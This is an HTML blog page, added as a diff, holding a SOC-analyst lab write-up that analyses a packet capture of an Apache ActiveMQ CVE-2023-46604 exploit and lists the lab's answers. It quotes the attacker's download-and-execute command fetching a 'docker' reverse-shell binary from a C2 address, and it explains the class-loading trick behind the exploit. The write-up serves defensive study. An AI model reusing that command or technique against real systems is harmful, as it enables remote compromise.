@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OpenWire — Apache ActiveMQ RCE (CVE-2023-46604) — cuddest</title>
+<meta name="description" content="OpenWire — Apache ActiveMQ RCE (CVE-2023-46604)">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="logo" href="../index.html#writing" aria-label="cuddest — back to writeups">
+      <svg class="logo-mark" viewBox="0 0 24 24" aria-hidden="true">
+        <rect x="1.6" y="1.6" width="20.8" height="20.8" rx="2"
+              fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M15.6 8.9a4.2 4.2 0 1 0 0 6.2" fill="none"
+              stroke="var(--logo-accent)" stroke-width="1.9" stroke-linecap="round"/>
+      </svg>
+      <span class="logo-word">uddest</span>
+    </a>
+    <span class="topbar-cta"><a class="ulink" href="../index.html#writing">← All writeups</a></span>
+  </div>
+</header>
+
+<article class="wpost">
+  <header class="wpost-head">
+    <p class="wpost-meta"><span>2026-03-26</span><span>8 min read</span></p>
+    <h1>OpenWire — Apache ActiveMQ RCE (CVE-2023-46604)</h1>
+  </header>
+  <div class="wpost-body">
+<h1>Scenario:</h1>
+<p>This lab explores an incident involving a public-facing server flagged by Tier-1 for suspicious outbound connections, and as a player you are going to act as a Tier-2 SOC Analyst.</p>
+<p>we are provided with a zipped PCAP file, so we are going for WireShark to analyze it.</p>
+<h1>Questions:</h1>
+<ol>
+<li><strong><em>By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration?</em></strong></li>
+</ol>
+<p>starting to go through our packets, you can notice a handshake was initiated on port 61616, this is an unfimilliar service to me so ive done some research about it, it turns out it is used by <strong>Apache ActiveMQ</strong> by default, an opens source message broker, and communicates over OpenWire protocol.</p>
+<p>in simple words, this broker work is to recieve messages from producers, place them in a queue, and when consumers connect to the port 61616, it serves them the message.</p>
+<p>after that at packet 4 we notice that the server accepted the connection and proceeded to the <strong>WireFormat Negotiation</strong> step, where the version check and protocol confirmation happens.</p>
+<p>then the most important packet: <strong>packet 5</strong>.</p>
+<p>here we can see the attacker sending an <code>ExceptionResponse</code> command which looks sucpecious, opening the packet to check the details confirmed that :</p>
+<p><img alt="img" src="images/Pasted image 20260326202958.png" /></p>
+<p>The Exception here is a <strong>Throwable</strong> which is the parent of all errors, inside it there is the <strong>Java Class Name</strong>.</p>
+<p>Why do we have to pass an error as an object ? bcs someone in the 90s thought everything should be a OO ig?</p>
+<p>so in a normal case, we would recieve an error that belongs to the throwable class of errors, we will build the object passed in the <strong>Class</strong> field by calling its constructor, and pass it the Message as a parameter, and that class will take care of the rest</p>
+<p>But yeah, whats you thinking of is exactly what happened, if you can pass an object as an error, and this protocol was built in the 90s so probably there is no strong security measure here, we can pass whatever we want in the class field !<br />
+Youre now meeting the crazy <strong>CVE-2023-46604</strong> .</p>
+<p>the attacker called <code>ClassPathXmlApplicationContext</code>, a class that also requires a one parameter in its constructor, and treats it as a url to call, which explains the Message part: a well crafted URL that calss the C2 server, exactly where it isserving the file invoice.xml, not just that, but this class also builds "beans" which are objects built based on XML files.</p>
+<p>checking the file by extracting from File&gt;Export Objects&gt;HTTP&gt;invoice.xml</p>
+<p>Reading it we can find that it is indeed a <strong>malicious Spring Bean configuration</strong>, which tells the app to create an instance of <code>ProcessBuilder</code> which is used to create OS processes,<br />
+ and passes the string:</p>
+<p>***<code>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker***</code></p>
+<p>To downlaod a malicious file from another ip of the C2 server: 128.199.52.72, make it executable and execute it.</p>
+<p>after doing this analysis i found myself answering most of the questions in the lab, so everything that was found for now will be answered directly.</p>
+<div class="answer">146.190.21.92</div>
+
+<pre><code>2.Initial entry points are critical to trace the attack vector back. What is the port number of the service the adversary exploited?
+</code></pre>
+<div class="answer">61616</div>
+
+<pre><code>3.Initial entry points are critical to trace the attack vector back. What is the port number of the service the adversary exploited?
+</code></pre>
+<div class="answer">Apache ActiveMQ</div>
+
+<pre><code>4.The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?
+</code></pre>
+<div class="answer">128.199.52.72</div>
+
+<pre><code>5.Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?
+</code></pre>
+<div class="answer">docker</div>
+
+<pre><code>6.What Java class was invoked by the XML file to run the exploit?
+</code></pre>
+<div class="answer">java.lang.ProcessBuilder</div>
+
+<pre><code>7.Identify the CVE identifier associated with this vulnerability.
+</code></pre>
+<p>as we referred earlier, this is an explpoit of a CVE that leads to Remote Code Execution (RCE) vulnerability in Apache ActiveMQ.</p>
+<div class="answer"><strong>CVE-2023-46604</strong></div>
+
+<pre><code>8.In which Java class and method was the validation step added?
+</code></pre>
+<p>following the link provided, we land to the GitHub commit for this cve fix, where we can see a layer of validation was added to the <strong>BaseDataStreamMarshaller</strong> class, exactly in the <strong>createThrowable</strong> method to make sure that the classes asked to be loaded are actually a subclass of the <strong>Throwable</strong> class.</p>
+<div class="answer">BaseDataStreamMarshaller.createThrowable</div>
+  </div>
+  <footer class="wpost-foot">
+    <a class="btn-line" href="../index.html#writing">← Back to all writeups</a>
+  </footer>
+</article>
+
+<footer class="colophon">
+  <div class="wrap colophon-in">
+    <span>© 2026 Ayoub Touati</span>
+    <span>Set in Geist &amp; JetBrains Mono</span>
+    <span><a class="ulink" href="../index.html#writing">Back to the site</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
